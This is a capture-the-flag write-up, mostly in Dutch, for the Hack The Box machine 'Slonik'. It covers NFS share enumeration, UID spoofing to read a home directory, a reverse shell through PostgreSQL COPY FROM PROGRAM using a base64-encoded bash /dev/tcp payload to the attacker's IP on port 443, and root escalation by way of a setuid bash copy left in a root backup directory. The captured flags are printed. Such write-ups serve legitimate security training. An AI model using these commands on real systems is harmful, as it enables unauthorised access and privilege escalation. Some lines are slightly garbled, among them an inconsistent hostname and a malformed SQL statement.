
The User flag for this Box is located in a non-standard directory, /var/lib/postgresql.
# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Slonik/backups]
└─$ nmap slonik.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-30 16:41 CET
Nmap scan report for slonik.htb (10.129.28.75)
Host is up (0.71s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Slonik/backups]
└─$ nmap -p22,111,2049 -sCV slonik.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-30 16:42 CET
Nmap scan report for slonik.htb (10.129.28.75)
Host is up (0.41s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36464/udp   mountd
|   100005  1,2,3      47813/tcp6  mountd
|   100005  1,2,3      51485/tcp   mountd
|   100005  1,2,3      57779/udp6  mountd
|   100021  1,3,4      35896/udp   nlockmgr
|   100021  1,3,4      43793/tcp6  nlockmgr
|   100021  1,3,4      44887/tcp   nlockmgr
|   100021  1,3,4      51976/udp6  nlockmgr
|   100024  1          35985/tcp   status
|   100024  1          37379/udp   status
|   100024  1          45552/udp6  status
|   100024  1          51377/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
```

Zoals je kunt zien is alleen de rpc poort open. We kunnen dus gaan kijken wat er op de mount staat door gebruik te maken van het showmount commando.


```
┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ showmount -e slonik.htb
Export list for slonik.htb:
/var/backups *
/home        *
```

Ik ben dus 2 folders gaan maken in mijn directory: een backups en home folder ben ik gaan maken. Eens dat de folders aangemaakt zijn kan je de mount gaan doen en kan je zien dat in de backups een .zip bestanden zijn. Ik zal 1 van de zip bestanden gaan kopieren naar de folder.

```
┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ mkdir backups
┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ mkdir home   
┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ ls
backups  home

┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ sudo mount -t nfs slonik.htb:/var/backups ./backups -o nolock

┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ sudo mount -t nfs slonik.htb:/home ./home -o nolock

┌──(kali㉿kali)-[~/HTB/Slonik/backups]
└─$ cp archive-2025-12-29T2218.zip /home/kali/HTB/Slonik

┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ unzip archive-2025-12-29T2218.zip                             
Archive:  archive-2025-12-29T2218.zip
```



```
┌──(kali㉿kali)-[~/HTB/Slonik/home]
└─$ ls -la
total 12
drwxr-xr-x 3 root root 4096 Oct 24  2023 .
drwxrwxr-x 6 kali kali 4096 Dec 30 15:45 ..
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 service

```

Maar zoals je kan zien heeft de gebruiker een 1337 user rechten nodig voor de files te kunnen bekijken. Ik ben dus een gebruiker gaan aanmaken voor kunnen aanteloggen als de gebruiker van dezelfde group rechten. Ik ben gebruiker ook in de sudoers group gaan zetten anders kon deze het mount commando niet uitvoeren.

```
┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ sudo useradd -u 1337 test 
# Password changing
sudo passwd test                                                     
New password: test
Retype new password: test
# Add to sudoers file
┌──(kali㉿kali)-[~/HTB/Slonik/home]
└─$ sudo usermod -aG sudo test
```

Als we nu zullen gaan connecteren met de test gebruiker zal je kunnen zien dat er een probleem is als je de mount maakt naar de home folder. De mount naar de home folder zal gaan maar zoals je zelf zult kunnen zien zal je nog steeds geen rechten hebben voor te kunnen kijken binnen deze folder. Dit kan je gaan doen door gebruik te maken van het chmod commando.

```
┌──(kali㉿kali)-[~/HTB/Slonik]
└─$ su test         
Password: 
$ id 
uid=1337(test) gid=1337(test) groups=1337(test)

sudo mount -t nfs slonik.vl:/home ./home -o nolock

$ ls -la
//
drwxr-xr-x  3 root root    4096 Oct 24  2023 home
drwxr-x---  2 kali kali    4096 Dec 29 23:43 service

$ cd service
$ ls -la
total 40
drwxr-x--- 5 test test 4096 Sep 22 14:46 .
drwxr-xr-x 3 root root 4096 Oct 24  2023 ..
-rw-r--r-- 1 test test   90 Sep 22 14:46 .bash_history
-rw-r--r-- 1 test test  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 test test 3771 Oct 24  2023 .bashrc
drwx------ 2 test test 4096 Oct 24  2023 .cache
drwxrwxr-x 3 test test 4096 Oct 24  2023 .local
-rw-r--r-- 1 test test  807 Oct 24  2023 .profile
-rw-r--r-- 1 test test  326 Sep 22 14:46 .psql_history
drwxrwxr-x 2 test test 4096 Oct 24  2023 .ssh
```

Ik ben eens gaan kijken naar de .ssh directory voor het zien of ik daar geen interessante informatie kon vinden en zoals je hier kunt zien heb ik een public en een private key gevonden. Ik zal deze gaan gebruiken voor een connectie met de ssh server. Je kan ook zien dat ik binnen de .psql_history de username service en password service gevonden heb.

```
$ cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILVvRkNfH3506q1Odsrb551zZC2AeLTYW135HnJLpjCe service@slonik
$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILVvRkNfH3506q1Odsrb551zZC2AeLTYW135HnJLpjCe service@slonik

$ cd .psql_history
sh: 35: cd: can't cd to .psql_history
$ cat .psql_history
CREATE DATABASE service;
\c service;
CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
select * from users;
\q
```

Ik ben de hash gaan cracken en heb hierbij een username en een password gevonden. Maar met de usercredentials kan ik geen connectie met de ssh server maken. Ik ben nog eens gaan kijken in de files en ben daar in de .bash_logout file gevonden dat ik het volgende commando mss kan gebruiken voor de connectie tussen de gebruiker en de windows machine.

KLEINER MAKEN VAN DE FILE
```
$ cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
$ cat .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
$ cat .bash_history
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
```

Een reverse shell werd verkregen door misbruik te maken van PostgreSQL’s `COPY FROM PROGRAM`, waarmee OS-commando’s uitgevoerd kunnen worden in de context van de `postgres` gebruiker. Hiervoor werd een bash-payload gebruikt die via `/dev/tcp` een uitgaande TCP-verbinding opent naar het aanvallersysteem. Om problemen met speciale karakters binnen SQL te vermijden, werd deze payload eerst Base64-gecodeerd en vervolgens binnen PostgreSQL gedecodeerd en uitgevoerd via `bash`.

Aan de aanvallerszijde werd een netcat listener gestart. De reverse shell werkte uitsluitend wanneer gebruik werd gemaakt van poort 443. Pogingen via andere poorten resulteerden niet in een verbinding. Dit gedrag wordt verklaard door egress filtering op de target, waarbij alleen standaardpoorten zoals 80 en 443 zijn toegestaan voor uitgaand verkeer. Omdat poort 443 doorgaans wordt geassocieerd met HTTPS, werd de verbinding toegelaten, terwijl andere poorten door firewallregels werden geblokkeerd.

Deze combinatie van OS-command execution binnen PostgreSQL en toegestane uitgaande HTTPS-verbindingen maakte het mogelijk om een succesvolle reverse shell op te zetten, ondanks beperkte netwerktoegang.

```
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'id';
COPY 1
postgres=# SELECT * FROM cmd_exec;

┌──(venv)─(kali㉿kali)-[~/HTB/Slonik]
└─$ echo "(bash >& /dev/tcp/10.10.15.83/443 0>&1) &" | base64
KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuODMvNDQzIDA+JjEpICYK

postgres=# DROP TABLE cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuODMvNDQzIDA+JjEpICYK |base64 -d|bash';SELECT * FROM cmd_exec;

┌──(venv)─(kali㉿kali)-[~/HTB/Slonik]
└─$ nc -lvnp 443  
Listening on 0.0.0.0 443
Connection received on 10.129.234.160 49020
ls

python3 -c 'import pty;pty.spawn("/bin/bash")'
postgres@slonik:/var/lib/postgresql$ cat user.txt
cat user.txt
2b5f3f93ef223555f4a5a8b29393fe9d
```

We weten nu door ervoor dat er een service achterliggend aan het draaien is da scripts gaat wegplaatsen. We gaan deze gaan zoeken door gebruik te maken van de volgende tool (pspy64).
The script will back up 2 directories, first it will remove all files inside /opt/backups/current and use ps_basebackup to take a base backup of a running PostgreSQL database to /opt/backups/current directory and will also zip file in that directory in zip file to /var/backups

```
2026/01/02 13:41:02 CMD: UID=0     PID=27343  | /usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/    
2026/01/02 13:42:01 CMD: UID=0     PID=27459  | /usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/  
```

Ik ben dus de /bin/bash folder gaan kopieren binnen mijn directory en deze van rechten gaan veranderen. Doordat het script elke minuut draait en dus de bestanden verwijderd en er weer in zet zal je kunnen zien hieronder dat de rechten van het bestand verwijderd zijn.

```
cp /bin/bash .
chmod 777 bash
chmod u+s bash

ls -lah
-rwsrwxrwx  1 postgres postgres 1.4M Jan  2 13:45 bash
```

We gaan nu het bash bestand gaan uitvoeren en kan je zien dat we priv esc gedaan hebben.

```
/opt/backups/current/bash -p
id
uid=115(postgres) gid=123(postgres) euid=0(root) groups=123(postgres),122(ssl-cert)
cat /root/root.txt
2cb582cd567bfd996cdb742eb1d544de

```

![[Pasted image 20260102154223.png]]